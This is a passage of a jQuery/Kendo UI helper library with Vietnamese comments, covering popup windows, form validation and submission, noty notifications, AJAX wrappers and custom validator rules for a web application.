                        $.noty.closeAll();

                        autoOpen = autoOpen == undefined ? true : autoOpen;

                        // Overflow
                        if (overflow != undefined) {
                            that.css("overflow", overflow);
                    }

                        if (autoOpen) {
                            popup.open();
                    }

                        // Mặc định là auto focus
                        if (autoFocus == undefined ||
                            autoFocus == true) {
                            that.setFocus();
                    }



                        // Kiểm tra và bổ sung
                        ajaxLoadingMark();
                    }
            },
                    error: function (e) {
                    showDefaultErrorMessage();
            }
            });
        }
    },
        kendoWindowAutoTopHeight: function () {

        var popupID = $(this).kendoWindowGetId();

        if (popupID != undefined) {

            var popup = $("#" +popupID).data("kendoWindow");

            popup.setOptions({
                    title: popup.title(),
                    maxHeight: $(window).height() -70
            });

            // Canh vị trí
            popup.center();
        }
    },
        /*form*/
        reset: function () {
        $(this).find(':input').each(function () {
            switch (this.type) {
                case 'password':
                case 'select-multiple':
                case 'select-one':
                case 'text':
                case 'textarea':
                    $(this).val('');
                    break;
                case 'checkbox':
                case 'radio':
                    this.checked = false;
        }
        });
    },
        formReset: function () {
        $(this).reset();

        $(this).find("input[data-role=dropdownlist]").each(function () {
            $('#' + $(this).attr('id')).data("kendoDropDownList").select(0);
        });

        $(this).find("input[data-role=combobox]").each(function () {
            $('#' + $(this).attr('id')).data("kendoComboBox").value("");
        });

        $(this).find("select[data-role=multiselect]").each(function () {
            $('#' + $(this).attr('id')).getKendoMultiSelect().value([]);
        });

        $(this).setFocus();
    },
        formIsValid: function (options, validate) {
        var form = this;
        var isValid = true;

            // Có options
        if (options != undefined) {
            $.each(options, function (name, value) {
                // Bổ sung hoặc gán value
                $(form).attr(name, value);
            });
        }

        validate = validate == undefined ? true : validate;

            // Cập nhật nội dung cho CKEditor element
        updateCKEditorElement();

        if (validate) {
            if ($(this).data("before-validate") != undefined &&
                $(this).data("before-validate").length > 0) {
                if (!getFunction($(this).data("before-validate"), ["e"]).apply(this)) {
                    return false;
            }
        }

            // Popup
            if (gOptions.ValidatePopup) {
                // Thiết lập validator
                var validatable = $(form).kendoValidator({
                        validateOnBlur: false,
                        errorTemplate: ''// '#=message#'
                }).data("kendoValidator");

                // Xóa class và attribue
                $(".pmt-invalid", form).removeClass("pmt-invalid");
                $("[" + gConts.VAL_TOOLTIP + "]", form).removeAttr(gConts.VAL_TOOLTIP);

                isValid = validatable.validate();

                // Validatate
                if (isValid === false) {
                    var errorMsg = "";

                    $.each(validatable._errors, function (key, value) {

                        var fieldName = key.replace("[", "_").replace("]", "__").replace(".", "_");
                        // Thay thế các ký tự đặt biệt cho dữ liệu đa ngôn ngữ
                        var selector = "#" +fieldName;

                        // Bỏ qua những hidden
                        if ($(selector).attr("type") == 'hidden') {
                            return;
                    }

                        var obj = $(selector, form);;

                        // Gán title để khi người dùng rê chuột lên sẽ hiển thị
                        if ($(selector).filter("[data-role]").length) {

                            var role = $(selector).attr("data-role");

                            if (role == "multiselect" ||
                                role == "dropdownlist" ||
                                role == "combobox") {
                                obj = $(selector, form).parent();
                                $(obj).addClass("k-invalid");
                            }
                            else if (role == "numerictextbox") {
                                obj = $(selector, form).parent();
                                $(obj).children(".k-formatted-value").addClass('pmt-invalid');
                        }
                        }
                        else if ($(selector).filter("[type=radio]").length) {
                            $(selector).closest("form").find("[name=" + fieldName + "]").addClass("k-invalid");
                    }

                        // Bổ sung tooltip
                        if ($(selector).attr("type") != 'radio') {
                            $(obj).attr(gConts.VAL_TOOLTIP, value);
                    }

                        // Thông báo lỗi
                        errorMsg += errorMsg.length != 0 ? "<br/>" : "";
                        errorMsg += value;
                    });

                    // Thay thế k-invalid bằng pmt-invalid
                    $(".k-invalid").addClass("pmt-invalid");
                    $(".k-invalid").removeClass("k-invalid");

                    // Hiển thị thông báo lỗi
                    $.message(errorMsg, gOptions.ValidatePopupType);

                    // Gán tooltip
                    var tooltipOptions = gOptions.ValidateTooltipOptions != null ?
                        gOptions.ValidateTooltipOptions : {
                                width: 200,
                                position: "right",
                                content: function (e) {
                                return $(e.target).attr(gConts.VAL_TOOLTIP);
                        }
                };

                    // Bổ sung filter
                    tooltipOptions.filter = "[" + gConts.VAL_TOOLTIP + "]";

                    // Tạo tooltip
                    $(form).kendoTooltip(tooltipOptions);
            }
            }
            else {
                $(form).kendoValidator();
        }

            // Focus đến input lỗi đầu tiên
            setTimeout(function () {
                var obj = $(".k-invalid:first", form);
                obj.focus().val(obj.val());
            }, 500);
        }

        return isValid;
    },
        formSubmit: function (options, validate) {
        var form = this;

        var isValid = $(this).formIsValid(options, validate);

        if (isValid)
            this.submit();
    },
        formSubmitSenderHandle: function (enable) {
        var senderID = $(this).attr(gConts.ATTR_CURRENT_SENDER_ID);

        if (senderID != undefined) {
            if (enable) {
                $("#" +senderID, this).enableButton();
            }
            else {
                $("#" +senderID, this).disableButton();
        }
        }
    },
        childFormReset: function () {
        var form = $(this).parents("form");

            // Tìm thấy
        if (form.length > 0) {
            $(form).formReset();
        }
    },
        childFormSubmit: function (options) {

        var form = $(this).parents("form");

            // Tìm thấy
        if (form.length > 0) {

            options = options || {
        };

            options[gConts.ATTR_CURRENT_SENDER_ID] = $(this).attr("id");

            $(form).formSubmit(options);
        }
    },
        formFilter: function () {
        var form = $(this).parents("form");

            // Tìm thấy
        if (form.length > 0) {

            var gridID = form.data("grid-id");
            var searchSuffix = form.data("search-suffix");

            if (gridID && searchSuffix) {
                $("#" +gridID).gridFilterByForm(form, searchSuffix);
        }
        }
    },
        formReadOnly: function () {
        var $form = $(this);
        $form.find("input[id]:not([data-role])").prop("readonly", "readonly");

            // Các widget của kendo thì dùng đối tượng kendo để set readonly
        $form.find("input[data-role]").each(function () {
            var $element = $(this);
            getKendoObject($element, $element.attr("data-role")).readonly(true);
        });

            // Checkbox, radio set thuộc tính disable
        $form.find("input:radio,input:checkbox").prop("disabled", "disabled");
    },
        /*uploadSelector*/
        browserPaste: function () {
        $(this).kendoWindowClose();
        var val = $(this).val();
        var targetID = $(this).attr("target-id");

        if (val.length > 0 &&
            targetID.length > 0) {
            var kendoMultiselect = $("#" +targetID).getKendoMultiSelect();

            var data = kendoMultiselect.dataSource;
            var selected = [];

            $.each(val.split('\n'), function () {
                if (this.length > 0) {
                    data.add({ name: this.substring(this.lastIndexOf('/') +1), url: this });
                    selected.push(this);
            }
            });

            kendoMultiselect.value(selected);
        }
    },
        /*control*/
        disableButton: function () {
        $(this).addClass("k-state-disabled");
        $(this).attr("onclick_old", $(this).attr("onclick"));
        $(this).removeAttr("onclick");
    },
        enableButton: function () {
        $(this).removeClass("k-state-disabled");
        $(this).attr("onclick", $(this).attr("onclick_old"));
    },
        setFocus: function () {
            /// <summary>
            /// Set focus cho control trong container. 
            /// Ưu tiên các input có attribute [first-focus=1], trong trường hợp không tìm thấy sẽ lấy input đầu tiên
            /// </summary>
        var container = this;

        var fn = function () {
            // Tìm phần tử có tag
            var obj = $(container).find("[first-focus=1]");

            // Không có dữ liệu hoặc bị disable, readonly
            if (obj.length == 0 ||
                obj[0].disabled == true ||
                obj.attr("readonly").length > 0) {

                obj = $(container).find(":input:not(:button,[type=submit],[type=reset],[disabled],[readonly]):visible:first");
        }

            obj.focus().val(obj.val());
        };

        setTimeout(fn, 500);
    },
        getField: function (value) {
            /// <summary>
            /// Lấy thông tin field: loại, parse function
            /// </summary>
            /// <param name="value"></param>
            /// <returns type=""></returns>
        var field = null;
        var element = $(this);

            // Lấy value
        if (!value) {
            value = element.val();
        }

        if (element.data("role") != undefined) {
            var role = element.data("role");

            if (role == "multiselect" ||
                role == "dropdownlist" ||
                role == "combobox" ||
                role == "numerictextbox") {
                // Boolean
                if (value == "true" || value == "false") {
                    field = {
                            type: "boolean", parse: gParsers["boolean"]
                };
                }
                else {
                    field = {
                            type: "number", parse: gParsers["number"]
                };
            }
            }
            else if (role == "datepicker" ||
                role == "datetimepicker" ||
                role == "timepicker") {

                var format = "yyyy/MM/dd hh:mm tt";
                var value = null;

                if (role == "datepicker") {
                    format = element.getKendoDatePicker().options.parseFormats;
                    value = element.getKendoDatePicker().value();
                }
                else if (role == "datetimepicker") {
                    format = element.getKendoDateTimePicker().options.parseFormats;
                    value = element.getKendoDateTimePicker().value();
                } else {
                    format = element.getKendoTimePicker().options.parseFormats;
                    value = element.getKendoTimePicker().value();
            }

                if (format.length > 1) {
                    format = format[format.length -1];
            }

                field = {
                        type: "date", parse: gParsers["date"], format: format, value: value
            };
        }
        }
        else if (element.attr("type") == "radio") {
            field = {
                    type: "boolean", parse: gParsers["boolean"]
        };
        }
        else if (element.attr("type") == "text") {
            field = {
                    type: "string", parse: gParsers["string"]
        };
        }

        return field;
    },
        valueOfControl: function () {
            /// <summary>
            /// Lấy giá trị của control tự động dựa theo loại control
            /// </summary>
            /// <returns type=""></returns>
        var value = $(this).val();

        var field = $(this).getField(value);

        if (field) {
            if (field.type == 'date') {
                return field.parse(field.value, field.format);
        }

            return field.parse(value);
        }

        return value;
    },
        setView: function (url, fnSuccess, fnFailed) {
            /// <summary>
            /// Gán nội dung lấy từ server bằng ajax vào một container
            /// </summary>
            /// <param name="url"></param>
            /// <param name="fnSuccess"></param>
            /// <param name="fnFailed"></param>
        var container = $(this);

        $.ajax({
                type: "GET",
                url: url,
                async: false,
                traditional: true,
                beforeSend: function () {
                kendo.ui.progress(container, true);
        },
                complete: function () {
                kendo.ui.progress(container, false);
        },
                success: function (e) {
                    // Không có lỗi
                if (!ajaxErrorHandler(e)) {
                    $(container).html(e);

                    var title = $(container).find('[window-title]').attr('window-title');

                    if (title != undefined) {
                        $('title').html(title);
                }

                    if (fnSuccess != undefined) {
                        // Là function name
                        if (typeof fnSuccess == "function") {
                            fnSuccess(e);
                        }
                        else if (typeof getFunction(fnSuccess) == "function") {
                            getFunction(fnSuccess, ["e"]).apply(e);
                    }
                }
                }
        },
                error: function (e) {
                showDefaultErrorMessage();
                kendo.ui.progress(container, false);

                if (fnFailed != undefined) {
                    // Là function name
                    if (typeof fnFailed == "function") {
                        fnFailed(e);
                    }
                    else if (typeof getFunction(fnFailed) == "function") {
                        getFunction(fnFailed, ["e"]).apply(e);
                }
                }
        }
        });
    },
});

/**********************************************************
 * jQuery Extend no selector
 **********************************************************/
jQuery.extend({
    /*message*/
    message: function (message, type, timeout) {

        type = type || 'information';
        timeout = timeout || gOptions.NotyDisplayTimeout;

        if (gOptions.NotyDismissQueue) {

        }
        else {
            // Đóng tất cả
            $.noty.closeAll();
        }

        var n = noty({
            text: message,
            type: type,
            dismissQueue: gOptions.NotyDismissQueue,
            layout: 'center',
            theme: 'defaultTheme',
            timeout: timeout,
            animation: {
                open: { height: 'toggle' },
                close: { height: 'toggle' },
                easing: 'swing',
                speed: 0
            }
        });
    },
    alert: function (message, timeout) {
        $.message(message, 'alert', timeout);
    },
    info: function (message, timeout) {
        $.message(message, 'information', timeout);
    },
    error: function (message, timeout) {
        $.message(message, 'error', timeout);
    },
    warning: function (message, timeout) {
        $.message(message, 'warning', timeout);
    },
    notify: function (message, timeout) {
        $.message(message, 'notification', timeout);
    },
    success: function (message, timeout) {
        $.message(message, 'success', timeout);
    },
    confirm: function (message, fnAccept, fnCancel) {
        var buttons = [];

        // Yes
        if (fnAccept != undefined) {
            buttons.push({
                addClass: 'btn btn-primary', text: gResources.txtAccept, onClick: function ($noty) {
                    $noty.close();
                    setTimeout(fnAccept, 0);
                }
            });
        }

        // No
        if (fnCancel != undefined) {
            buttons.push({
                addClass: 'btn btn-danger', text: gResources.txtNotAccept, onClick: function ($noty) {
                    $noty.close();
                    setTimeout(fnCancel, 0);
                }
            });
        }

        // Cancel
        buttons.push({
            addClass: 'btn btn-warning', text: gResources.txtCancel, onClick: function ($noty) {
                $noty.close();
            }
        });

        noty({
            text: message,
            type: 'information',
            dismissQueue: false,
            layout: 'center',
            theme: 'defaultTheme',
            modal: true,
            animation: {
                open: { height: 'toggle' },
                close: { height: 'toggle' },
                easing: 'swing',
                speed: 0
            },
            buttons: buttons
        });
    },
    /*resource*/
    getResourceFromBody: function (name) {
        return $("body").getAttr(name);
    },
    /*ajax*/
    ajaxPostData: function (url, data, fnSuccess, fnFailure, options) {
        var ajaxOptions = $.extend({}, {
            type: "POST",
            url: url,
            data: data,
            async: false,
            traditional: true,
            success: function (e) {
                // Không có lỗi
                if (!ajaxErrorHandler(e) &&
                    fnSuccess != undefined &&
                    fnSuccess != null) {
                    fnSuccess(e);
                }
                else {
                    if (fnFailure != undefined &&
                        fnFailure != null) {
                        fnFailure(e);
                    }
                }
            },
            error: function (e) {
                showDefaultErrorMessage();
            }
        }, options);

        // Gửi dữ liệu
        $.ajax(ajaxOptions);
    },
    ajaxPostJson: function (url, jsonData, fnSuccess, fnFailure, options) {

        $.ajaxPostData(url, jsonData, fnSuccess, fnFailure, $.extend({}, options, { contentType: 'application/json; charset=utf-8' }));
    },
    ajaxPostModels: function (url, models, fnSuccess, fnFailure) {
        // Xây dựng dữ liệu
        var data = $.toJSON({ models: models });

        $.ajaxPostJson(url, data, fnSuccess);
    },
    /*validation*/
    remoteValidate: function (url, data) {
        var valid = true;

        $.ajax(
        {
            type: "POST",
            url: url,
            data: $.toJSON(data),
            async: false,
            traditional: true,
            contentType: 'application/json; charset=utf-8',
            success: function (e) {
                if (!e.Passed) {
                    if (!$.stringIsNullOrEmpty(e.Message)) {
                        $.error(e.Message);
                    }
                }

                valid = e.Passed;
            }
        });

        return valid;
    },
    validateGetMessage: function (input, attr) {
        return input.attr(attr);
    },
    validateCompare: function (input, type) {
        if (input.filter("[data-val-" + type + "-other]").length) {
            var otherField = input.attr("data-val-" + type + "-other");

            otherField = otherField.substr(otherField.lastIndexOf(".") + 1);

            if (type == "equalto") {
                return input.valueOfControl() == $("#" + otherField).valueOfControl();
            }
            else if (type == "greaterthan") {
                return $("#" + otherField).valueOfControl() != undefined && input.valueOfControl() ?
                    input.valueOfControl() > $("#" + otherField).valueOfControl() : true;
            }
            else if (type == "greaterthanorequal") {
                return $("#" + otherField).valueOfControl() != undefined && input.valueOfControl() ?
                    input.valueOfControl() >= $("#" + otherField).valueOfControl() : true;
            }
        }
        return true;
    },
    validateCompareMessage: function (input, type) {
        return $.validateGetMessage(input, "data-val-" + type);
    },
    /*other*/
    stringIsNullOrEmpty: function (val) {
        return val == undefined || val == null || val.length == 0;
    },
    stringNullThenEmpty: function (val) {
        return val == undefined || val == null ? "" : val;
    },
    randomString: function (length, special) {
        /// <summary>
        /// Tạo ra một chuỗi ngẫu nhiên
        /// </summary>
        /// <param name="length">Độ dài</param>
        /// <param name="special">true: dùng các ký tự đặt biệt</param>
        /// <returns type=""></returns>
        var iteration = 0;
        var password = "";
        var randomNumber;
        if (special == undefined) {
            var special = false;
        }
        while (iteration < length) {
            randomNumber = (Math.floor((Math.random() * 100)) % 94) + 33;
            if (!special) {
                if ((randomNumber >= 33) && (randomNumber <= 47)) { continue; }
                if ((randomNumber >= 58) && (randomNumber <= 64)) { continue; }
                if ((randomNumber >= 91) && (randomNumber <= 96)) { continue; }
                if ((randomNumber >= 123) && (randomNumber <= 126)) { continue; }
            }
            iteration++;
            password += String.fromCharCode(randomNumber);
        }
        return password;
    },
    getUnique: function (length, special) {
        /// <summary>
        /// Tạo ra một chuỗi ngẫu nhiên
        /// </summary>
        /// <param name="length">Độ dài</param>
        /// <param name="special">true: dùng các ký tự đặt biệt</param>
        /// <returns type=""></returns>
        return $.randomString(length, special);
    },
    blockHtmlSelection: function (element) {
        /// <summary>
        /// Prevent user from selecting on element
        /// </summary>
        $(element).mousedown(function (e) {
            e.preventDefault();
            return false;
        });
    }
});

/**********************************************************
 * jquery.unobtrusive-ajax
 **********************************************************/

function ajaxFormBeforeForGetDataForSubmit() {
    /// <summary>
    /// Phương thức gọi trước khi gọi lệnh submit
    /// </summary>
    // Cập nhật dữ liệu cho CKEditor
    updateCKEditorElement();
}

function ajaxLoadingMark() {
    /// <summary>
    /// Kiểm tra và bổ sung ajax loading mark nếu chưa tồn tại
    /// </summary>
    if ($("[data-ajax-loading]").length > 0) {
        $("[data-ajax-loading]").each(function (e) {
            var id = $(this).getAttr("data-ajax-loading");

            // Chưa tồn tại
            if ($(id).length == 0) {
                var html = "<div id='" + id.replace("#", "") + "' class='k-loading-mask' style='width: 100%; height: 100%; top: 0px; left: 0px; display: none; z-index: 100000;'>" +
                    "<span class='k-loading-text'>...</span><div class='k-loading-image' /><div class='k-loading-color' /></div>";
                $(html).appendTo(document.body);
            }
        });
    }
}

/**********************************************************
 * Others
 **********************************************************/

function showPopup(popupID, url, isModal, options) {
    /// <summary>
    /// Hiển thị popup tự động khởi tạo kendo window
    /// </summary>
    /// <param name="popupID"></param>
    /// <param name="url"></param>
    /// <param name="isModal"></param>
    /// <param name="options"></param>
    var popup;
    var defaultOptions = {
        "modal": isModal ? true : isModal,
        "iframe": false,
        "draggable": true,
        "title": "",
        "resizable": true,
        "width": 0,
        "scrollable": true,
        "actions": ["Close"],
        "visible": false,
        "close": function () { $("#" + popupID).empty(); }
    };
    options = $.extend(options, defaultOptions);

    // Chưa tồn tại popup
    if ($("#" + popupID).length == 0) {
        popup = $("<div id='" + popupID + "' />").appendTo(document.body).kendoWindow(options).data('kendoWindow');

        // Canh vị trí
        popup.center();
    }
    $("#" + popupID).kendoWindowRefresh(url, "");
}

function showPopupWindow(popupID, url, isModal, options) {
    /// <summary>
    /// Hiển thị popup tự động khởi tạo kendo window
    /// </summary>
    /// <param name="popupID"></param>
    /// <param name="url"></param>
    /// <param name="isModal"></param>
    /// <param name="options"></param>
    var popup;
    var defaultOptions = {
        "modal": isModal ? true : isModal,
        "iframe": false,
        "draggable": true,
        //"title": "",
        //"width": 0,
        "resizable": true,      
        "scrollable": true,
        "actions": ["Close"],
        "visible": false,
        "close": function () { $("#" + popupID).empty(); }
    };
    options = $.extend(options, defaultOptions);

    // Chưa tồn tại popup
    if ($("#" + popupID).length == 0) {
        popup = $("<div id='" + popupID + "' />").appendTo(document.body).kendoWindow(options).data('kendoWindow');

        // Canh vị trí
        popup.center();
    }
    else {
        popup = $('#' + popupID);
    }
    $("#" + popupID).kendoWindowRefresh(url, "");
}

function updateCKEditorElement() {
    /// <summary>
    /// Cập nhật nội dung cho CKEditor element
    /// </summary>
    if (typeof (CKEDITOR) !== 'undefined') {
        for (instance in CKEDITOR.instances) {
            CKEDITOR.instances[instance].updateElement();
        }
    }
}

function ajaxErrorHandler(e) {
    
    /// <summary>
    /// Xử lý lỗi cho ajax
    /// </summary>
    /// <param name="e" type=""></param>
    /// <returns type="Boolean">true: có lỗi else không có lỗi</returns>
    var message = getErrors(e);

    if (message.length > 0) {
        //$.error(message);

        var isWarning = false;
        try {
            if (e.Errors.Warning.errors.length > 0) {
                isWarning = true;
            }
        } catch (e) { }

        if (isWarning) {
            $.warning(message);
        } else {
            $.error(message);
        }

        var code = undefined;

        if (e.errors.message != undefined || e.Errors != undefined) {
            code = e.errors.message.code != undefined ? e.errors.message.code : e.Errors.message.code;
        }

        // Hết session hoặc không có quyền
        if (code != undefined &&
            code == 403) {
            setTimeout(function () {
                // Làm mới trang
                location.reload();
            }, gOptions.NotyDisplayTimeout);
        }

        return true;
    }

    return false;
}

function dataSourceRequestStart(e) {
    /// <summary>
    /// Xử lý requestStart cho dataSource
    /// </summary>
    /// <param name="e"></param>
    // Kiểm tra các field required trên form filter
    $("form[data-role=filter]").each(function () {
        var form = $(this);
        var gridID = form.data("grid-id");

        // Cùng datasource
        if (gridID && $("#" + gridID).gridDataSource() == e.sender) {
            // Có lỗi trên form
            if (!form.formIsValid()) {
                e.preventDefault();
            }
        }
    });
}

function dataSourceRequestEnd(e) {
    /// <summary>
    /// Xử lý requestEnd cho dataSource
    /// </summary>
    /// <param name="e"></param>
    var dataSource = e.sender;

    // Cập nhật
    if (e.type == "update") {
        var errors = e.response.Errors == undefined ? e.response.errors : e.response.Errors;

        // Không có lỗi
        if (errors == undefined) {

            // Có phương thức callback
            if (dataSource.updateCallback != null &&
                dataSource.updateCallback != undefined) {
                // Gọi phương thức
                setTimeout(dataSource.updateCallback, 0);
            }
            else {
                // Thông báo
                $.success(gResources.msgSuccess);
            }
        }
        else { // Có lỗi

        }

        // Có grid
        if (dataSource.grid != undefined) {
            $(dataSource.grid.wrapper).gridOnAction({ action: gGridActions.save, data: { data: e, isSuccess: errors == undefined } });
        }
    }
    else if (e.type == "read") {
        // Không có dữ liệu để hiển thị, có thể do lọc hoặc db không có dữ liệu
        if (e.response.Total == 0 &&
            gOptions.GridShowNoDataMsg) {
            $.warning(gResources.msgNoDataToDisplay, 1000);
        }

        // Bỏ checkall
        if (dataSource.grid != undefined) {
            $("[select=selecteAll]", dataSource.grid.wrapper).attr("checked", false);
        }
    }
}

function dataSourceRecordIndexIncrease() {
    /// <summary>
    /// Tạo cột thứ tự
    /// </summary>
    /// <returns type=""></returns>
    gRecordIndex = gRecordIndex == undefined ? 1 : gRecordIndex + 1;
    return gRecordIndex;
}

function getErrors(e) {
    /// <summary>
    /// Phân tích lỗi từ JSON trả về từ server
    /// </summary>
    /// <param name="e"></param>
    /// <returns type=""></returns>
    var message = "";

    if (e.Errors || e.errors) {
        var errors = e.Errors == undefined ? e.errors : e.Errors;
        if (errors) {
            $.each(errors, function (key, value) {
                if ('errors' in value) {
                    $.each(value.errors, function () {
                        message += this + "<br/>";
                    });
                }
            });

            message = message.substr(0, message.lastIndexOf("<br/>"));
        }
    }

    return message;
}

function showDefaultErrorMessage() {
    /// <summary>
    /// Hiển thị lỗi mặc định
    /// </summary>
    $.error(gResources.msgError);
}

function popupEditorBegin(xhr, options) {
    /// <summary>
    /// AjaxOptions.OnBegin
    /// </summary>
    /// <param name="xhr"></param>
    /// <param name="options"></param>
    /// <returns type=""></returns>
    if ($("#ajaxValidationMessage") != undefined)
        $("#ajaxValidationMessage").empty();

    // Disable sender
    $('#' + options.FormID).formSubmitSenderHandle(false);

    return true;
}

function popupEditorSuccess(data, status, xhr, options) {
    /// <summary>
    /// AjaxOptions.OnSuccess
    /// </summary>
    /// <param name="data"></param>
    /// <param name="status"></param>
    /// <param name="xhr"></param>
    /// <param name="options"></param>
    var message = getErrors(data);
    var error = true;

    // Bật button
    $('#' + options.FormID).formSubmitSenderHandle(true);

    // Có dữ liệu trả về nhưng không phải là dữ liệu lỗi
    if (data.length > 0 && message.length == 0) {
        message = gResources.msgError;
        error = true;
    }
        // Không có lỗi
    else if (message.length == 0) {
        message = gResources.msgSuccess;
        error = false;
    }

    if (message.length > 0) {
        if (error) {
            //$.error(message);
            //if (console)
            //    console.log(message);
            var isWarning = false;
            try {
                if (data.Errors.Warning.errors.length > 0) {
                    isWarning = true;
                }
            } catch (e) { }

            if (isWarning) {
                $.warning(message);
            } else {
                $.error(message);
            }
        }
        else {
            $.success(message);

            // Có options
            if (options != undefined) {

                options.Data = data;
                // Có hàm gọi
                // IE7 OnSuccess luôn là null khi thêm mới
                if (options.OnSuccess != null) {
                    getFunction(options.OnSuccess, ["options"]).apply(null, [options]);
                }

                // Lấy div kendoWindow
                var objPopup = options.FormID != null ? $('#' + options.FormID).closest('[data-role=window]') : null;

                // Có object
                if (objPopup != null) {

                    // Thêm mới
                    if (options.IsAdd) {
                        var continueAdd = $("#" + options.FormID).getAttr(gConts.ATTR_CONTINUE_ADD);

                        // Tiếp tục thêm mới
                        if (eval(continueAdd)) {
                            var popup = $(objPopup).data('kendoWindow');
                            $(objPopup).kendoWindowRefresh(options.Url, popup.title(), null, false);
                        }
                        else {
                            $(objPopup).kendoWindowClose();
                            return;
                        }
                    }
                    else {
                        // Nếu AutoClose null thì lấy từ options
                        options.AutoClose = options.AutoClose == null ? gOptions.PopupEditAutoClose : options.AutoClose;

                        // Tự động đóng
                        if (options.AutoClose) {
                            $(objPopup).kendoWindowClose();
                            return;
                        }
                    }

                    $(objPopup).setFocus();
                }
            }
        }
    }
}

function popupEditorFailure(xhr, status, options) {
    /// <summary>
    /// AjaxOptions.Failure
    /// </summary>
    /// <param name="xhr"></param>
    /// <param name="status"></param>
    /// <param name="options"></param>
    showDefaultErrorMessage();

    // Có options
    if (options != undefined) {

        $('#' + options.FormID).formSubmitSenderHandle(true);

        // Có hàm gọi
        if (options.OnFailure != null) {
            getFunction(options.OnFailure, ["options"]).apply(options);
        }
    }
}

function getFunction(code, argNames) {
    /// <summary>
    /// Lấy function từ tên và tham số
    /// Tham khảo từ jquery.unobtrusive-ajax.js
    /// </summary>
    /// <param name="code"></param>
    /// <param name="argNames"></param>
    /// <returns type=""></returns>
    var fn = window, parts = (code || "").split(".");
    while (fn && parts.length) {
        fn = fn[parts.shift()];
    }
    if (typeof (fn) === "function") {
        return fn;
    }
    argNames.push(code);
    return Function.constructor.apply(null, argNames);
}

function buildUrl(base, value) {
    /// <summary>
    /// Tạo url
    /// </summary>
    /// <param name="base"></param>
    /// <param name="value"></param>
    /// <returns type=""></returns>
    var sep = (base.indexOf('?') > -1) ? '&' : '?';
    return base + sep + value;
}

function getUrlWithAdditionData(url, additionData) {
    /// <summary>
    /// Tạo url với function additionData
    /// </summary>
    /// <param name="url"></param>
    /// <param name="additionData"></param>
    /// <returns type=""></returns>
    var e = { cancel: false };

    if (additionData) {

        var additionJson = null;

        // Là function
        if (typeof additionData == "function") {
            additionJson = additionData(e);
        }
        else {
            // Là function name
            if (typeof getFunction(additionData) == "function") {
                additionJson = getFunction(additionData, "e").apply(e);
            } else {
                url = buildUrl(url, additionData);
            }
        }

        if (additionJson != null) {
            url = buildUrl(url, $.param(additionJson));
        }
    }

    return e.cancel ? false : url;
}

/**********************************************************
 *  Document ready
 **********************************************************/
$(document).ready(function () {
    // Gán resource
    gResources.msgSuccess = $.getResourceFromBody("data-update-success-msg");
    gResources.msgError = $.getResourceFromBody("data-default-error-msg");
    gResources.msgHasChanges = $.getResourceFromBody("data-has-changes-msg");
    gResources.msgNoChange = $.getResourceFromBody("data-no-change-msg");
    gResources.msgNoDataToDisplay = $.getResourceFromBody("data-no-data-to-display-msg");
    gResources.msgNotSelected = $.getResourceFromBody("data-not-selected-msg");
    gResources.msgOnlySelectOne = $.getResourceFromBody("data-only-select-one-msg");
    gResources.txtAccept = $.getResourceFromBody("data-accept-txt");
    gResources.txtNotAccept = $.getResourceFromBody("data-not-accept-txt");
    gResources.txtCancel = $.getResourceFromBody("data-cancel-txt");

    // Thiết lập CKEDITOR để không encode unicode
    if (typeof (CKEDITOR) !== 'undefined') {

        CKEDITOR.config.htmlEncodeOutput = false;
        CKEDITOR.config.entities = false;
        CKEDITOR.config.basicEntities = true;
        CKEDITOR.config.forceSimpleAmpersand = true;
    }

    // Extend KendoUI Validator
    (function ($, kendo) {
        $.extend(true, kendo.ui.validator, {
            rules: {
                required: function (input) {
                    if (input.filter("[data-val-required]").length &&
                        input.attr('type') != 'hidden') {

                        // Radio
                        if (input.attr("type") == "radio") {
                            return input.closest("form").find("[name=" + input.attr("name") + "]").is(":checked");
                        }

                        var //checkbox = input.filter("[type=checkbox]").length && !input.is(":checked"),
                            value = input.val();

                        // Trim
                        if (typeof value == "string") {
                            var trimmed = $.trim(value);

                            // Chỉ là khoảng trắng không
                            //if (value.length != trimmed.length &&
                            //    trimmed.length == 0) {
                            //    input.val(trimmed);
                            //}

                            value = trimmed;
                        }

                        return !((value === "" || !value /*|| checkbox*/));
                    }

                    return true;
                },
                requiredcheckbox: function (input) {
                    if (input.filter("[data-val-requiredcheckbox]").length) {

                        var requirednumber = input.attr("data-val-requiredcheckbox-number");

                        // Check không đủ số lượng 
                        if ($('input[name="' + input.attr("data-val-name") + '"]:checked').length < requirednumber)
                            return false;
                    }

                    return true;
                },
                equalto: function (input) {
                    return $.validateCompare(input, "equalto");
                },
                greaterthan: function (input) {
                    return $.validateCompare(input, "greaterthan");
                },
                greaterthanorequal: function (input) {
                    return $.validateCompare(input, "greaterthanorequal");
                },
                captcha: function (input) {
                    if (input.filter("[data-val-captcha]").length) {
                        var captchaIDField = input.attr("data-val-captcha-id");
                        var valid = true;

                        $.ajax(
                        {
                            url: gOptions.CaptchaValidateUrl + $("#" + captchaIDField).val() + "?value=" + input.val(),
                            dataType: "json",
                            async: false,
                            success: function (data) {
                                valid = data["valid"];
                            }
                        });

                        return valid;
                    }
                    return true;
                },
                remote: function (input) {
                    if (input.filter("[data-val-remote]").length) {

                        var url = input.attr("data-val-remote-url");
                        var valid = true;
                        var fields = eval(input.attr("data-val-remote-fields"));
                        var additionData = {};
                        var value = input.val();

                        $(fields).each(function (e) {
                            var fieldID = this;

                            if ($("#" + fieldID).attr("type") == "radio" || $("#" + fieldID).attr("type") == "checkbox") {
                                additionData[fieldID] = $("[name=" + fieldID + "]:checked").val();
                            }
                            else {
                                additionData[fieldID] = $("#" + fieldID).val();
                            }
                        });

                        var model = { Value: input.val(), AdditionData: additionData };

                        $.ajax(
                        {
                            type: "POST",
                            url: url,
                            data: $.toJSON({ model: model }),
                            async: false,
                            traditional: true,
                            contentType: 'application/json; charset=utf-8',
                            success: function (e) {
                                if (!e.Passed) {
                                    if (!$.stringIsNullOrEmpty(e.Message)) {
                                        // Gán lại message
                                        input.attr("data-val-remote", e.Message);
                                    }
                                }

                                valid = e.Passed;
                            }
                        });

                        return valid;
                    }

                    return true;
                },
                email: function (input) {
                    if (input.filter("[data-val-email]").length) {
